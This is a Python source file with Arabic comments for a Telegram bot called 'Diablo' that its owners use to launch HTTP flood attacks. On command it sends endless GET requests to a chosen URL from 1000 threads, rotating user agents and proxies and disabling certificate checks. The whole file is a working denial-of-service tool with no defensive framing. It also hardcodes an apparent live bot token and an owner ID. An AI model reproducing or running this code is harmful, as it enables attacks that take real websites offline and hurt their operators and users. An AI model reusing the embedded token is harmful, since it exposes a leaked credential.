import requests
import threading
import urllib3
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import logging
import random

# إعداد السجلات
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# تعطيل التحقق من صحة شهادة SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# وكلاء المستخدم
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, مثل Gecko) Chrome/90.0.4430.93 Safari/537.36',
    # أضف المزيد من وكلاء المستخدم هنا
]

# قائمة البروكسيات
proxies = []

# إنشاء جلسة واحدة للاستخدام المتكرر
session = requests.Session()
session.verify = False

# متغير لتخزين عدد البايتات المنقولة
bytes_transferred = 0
lock = threading.Lock()

# متغير لإيقاف الهجوم
stop_attack_event = threading.Event()

# قائمة المالكين
Owner = ['6358035274']
NormalUsers = []

# قراءة القوائم من الملفات
def load_lists():
    global Owner, NormalUsers
    try:
        with open('owner.txt', 'r') as file:
            Owner = file.read().splitlines()
        with open('normal_users.txt', 'r') as file:
            NormalUsers = file.read().splitlines()
    except FileNotFoundError:
        logging.warning("لم يتم العثور على ملفات القوائم. سيتم استخدام القوائم الفارغة.")
        pass

load_lists()

# دالة الهجوم
def attack(url):
    global bytes_transferred
    while not stop_attack_event.is_set():
        try:
            # تحديث الرؤوس والبروكسي لكل طلب
            headers = {
                'User-Agent': random.choice(user_agents),
            }
            if proxies:
                proxy = {'http': random.choice(proxies), 'https': random.choice(proxies)}
                try:
                    response = session.get(url, headers=headers, proxies=proxy, timeout=5)
                except requests.RequestException:
                    logging.warning("البروكسي لم يعمل، التحويل إلى الوضع العادي.")
                    response = session.get(url, headers=headers)
            else:
                response = session.get(url, headers=headers)

            with lock:
                bytes_transferred += len(response.content)
            logging.info(f"تم إرسال الطلب إلى: {url}")
        except requests.RequestException as e:
            logging.error(f"حدث خطأ: {e}")

# بدء الهجوم
def start_attack(url):
    stop_attack_event.clear()
    max_requests_per_second = 1000  # عدد الطلبات المراد إرسالها في الثانية
    with ThreadPoolExecutor(max_workers=max_requests_per_second) as executor:
        futures = [executor.submit(attack, url) for _ in range(max_requests_per_second)]  # إرسال عدد الطلبات

    for future in futures:
        try:
            future.result()
        except Exception as e:
            logging.error(f"خطأ في تنفيذ الخيط: {e}")

# إيقاف الهجوم
def stop_attack():
    stop_attack_event.set()
    logging.info("تم إيقاف الهجوم.")

# حساب سرعة النقل
def calculate_speed():
    global bytes_transferred
    while not stop_attack_event.is_set():
        time.sleep(1)
        with lock:
            speed = bytes_transferred / (1024 * 1024)  # تحويل البايتات إلى ميغابايت
            bytes_transferred = 0
        logging.info(f"سرعة النقل: {speed:.1000f} MB/s")

# إنشاء البوت باستخدام التوكن الخاص بك
TOKEN = '7317402155:AAHNB3hgGqKXiLqF1OhTYLG78HmTlm8dYI4'
bot = telebot.TeleBot(TOKEN)

# تحقق من صحة المالك
def is_owner(user_id):
    return str(user_id) in Owner

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if is_owner(message.from_user.id):
        bot.reply_to(message, "مرحبًا بك في بوت ديابلو! استخدم القائمة أدناه لاختيار الأوامر.")
    else:
        bot.reply_to(message, "أنت لا تملك الصلاحيات الكافية لاستخدام هذا البوت.")

    # إنشاء الأزرار التفاعلية إذا كان المستخدم مالكًا
    if is_owner(message.from_user.id):
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("إضافة مستخدم", callback_data="add_user"))
        markup.add(InlineKeyboardButton("إزالة مستخدم", callback_data="remove_user"))
        markup.add(InlineKeyboardButton("بدء هجوم", callback_data="start_attack"))
        markup.add(InlineKeyboardButton("إيقاف الهجوم", callback_data="stop_attack"))
        markup.add(InlineKeyboardButton("إضافة بروكسي", callback_data="add_proxy"))
        markup.add(InlineKeyboardButton("إزالة بروكسي", callback_data="remove_proxy"))
        markup.add(InlineKeyboardButton("عرض البروكسيات", callback_data="show_proxies"))
        markup.add(InlineKeyboardButton("إضافة مجموعة من البروكسيات", callback_data="add_multiple_proxies"))
        bot.send_message(message.chat.id, "اختر أحد الأوامر:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: is_owner(call.message.chat.id))
def callback_query(call):
    if call.data == "add_user":
        msg = bot.send_message(call.message.chat.id, "أدخل معرف المستخدم لإضافته:")
        bot.register_next_step_handler(msg, add_user)
    elif call.data == "remove_user":
        msg = bot.send_message(call.message.chat.id, "أدخل معرف المستخدم لإزالته:")
        bot.register_next_step_handler(msg, remove_user)
    elif call.data == "start_attack":
        msg = bot.send_message(call.message.chat.id, "أدخل URL للهجوم:")
        bot.register_next_step_handler(msg, start_attack_command)
    elif call.data == "stop_attack":
        stop_attack()
        bot.send_message(call.message.chat.id, "تم إيقاف الهجوم.")
    elif call.data == "add_proxy":
        msg = bot.send_message(call.message.chat.id, "أدخل البروكسي لإضافته (بصيغة http://ip:port):")
        bot.register_next_step_handler(msg, add_proxy)
    elif call.data == "remove_proxy":
        msg = bot.send_message(call.message.chat.id, "أدخل البروكسي لإزالته (بصيغة http://ip:port):")
        bot.register_next_step_handler(msg, remove_proxy)
    elif call.data == "show_proxies":
        show_proxies(call.message)
    elif call.data == "add_multiple_proxies":
        msg = bot.send_message(call.message.chat.id, "أدخل البروكسيات لإضافتها (كل بروكسي في سطر جديد):")
        bot.register_next_step_handler(msg, add_multiple_proxies)

def add_user(message):
    user_id = message.text.strip()
    if user_id not in Owner:
        Owner.append(user_id)
        with open('owner.txt', 'a') as file:
            file.write(user_id + '\n')
        bot.reply_to(message, f"تمت إضافة المستخدم {user_id} بنجاح.")
    else:
        bot.reply_to(message, f"المستخدم {user_id} موجود بالفعل.")

def remove_user(message):
    user_id = message.text.strip()
    if user_id in Owner:
        Owner.remove(user_id)
        with open('owner.txt', 'w') as file:
            file.write('\n'.join(Owner) + '\n')
        bot.reply_to(message, f"تمت إزالة المستخدم {user_id} بنجاح.")
    else:
        bot.reply_to(message, f"المستخدم {user_id} غير موجود.")

def start_attack_command(message):
    url = message.text.strip()
    bot.send_message(message.chat.id, f"بدء الهجوم على {url}.")
    start_attack(url)

def add_proxy(message):
    proxy = message.text.strip()
    if proxy not in proxies:
        proxies.append(proxy)
        bot.reply_to(message, f"تمت إضافة البروكسي {proxy} بنجاح.")
    else:
        bot.reply_to(message, f"البروكسي {proxy} موجود بالفعل.")

def remove_proxy(message):
    proxy = message.text.strip()
    if proxy in proxies:
        proxies.remove(proxy)
        bot.reply_to(message, f"تمت إزالة البروكسي {proxy} بنجاح.")
    else:
        bot.reply_to(message, f"البروكسي {proxy} غير موجود.")

def show_proxies(message):
    if proxies:
        bot.reply_to(message, "قائمة البروكسيات:\n" + "\n".join(proxies))
    else:
        bot.reply_to(message, "لا توجد بروكسيات مضافة.")

def add_multiple_proxies(message):
    new_proxies = message.text.strip().split('\n')
    added_proxies = []
    for proxy in new_proxies:
        proxy = proxy.strip()
        if proxy and proxy not in proxies:
            proxies.append(proxy)
            added_proxies.append(proxy)
    if added_proxies:
        bot.reply_to(message, f"تمت إضافة البروكسيات التالية بنجاح:\n" + "\n".join(added_proxies))
    else:
        bot.reply_to(message, "لم يتم إضافة أي بروكسيات جديدة.")

# بدء حساب سرعة النقل في خيط منفصل
speed_thread = threading.Thread(target=calculate_speed)
speed_thread.start()

# بدء البوت
bot.polling()
